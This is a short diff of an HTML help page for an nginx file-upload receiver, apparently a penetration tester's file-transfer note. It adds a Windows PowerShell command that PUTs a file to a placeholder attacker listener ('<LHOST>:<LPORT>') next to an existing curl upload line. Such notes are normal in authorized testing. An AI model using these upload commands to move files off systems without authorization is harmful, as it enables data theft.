@@ -25,5 +25,8 @@ systemctl restart nginx<br/>
 <br/>
 <br/>
 <br/>
-upload with:<br/>
-curl --upload-file &lt;file&gt; 127.0.0.1:8001</body></html>
+Linux upload with:<br/>
+curl --upload-file &lt;file&gt; 127.0.0.1:8001<br/>
+<br/>
+Windows upload with:<br/>
+ps&gt; Invoke-RestMethod -Method PUT -Uri "http://&lt;LHOST&gt;:&lt;LPORT&gt;/filename_to_upload" -Body</body></html>
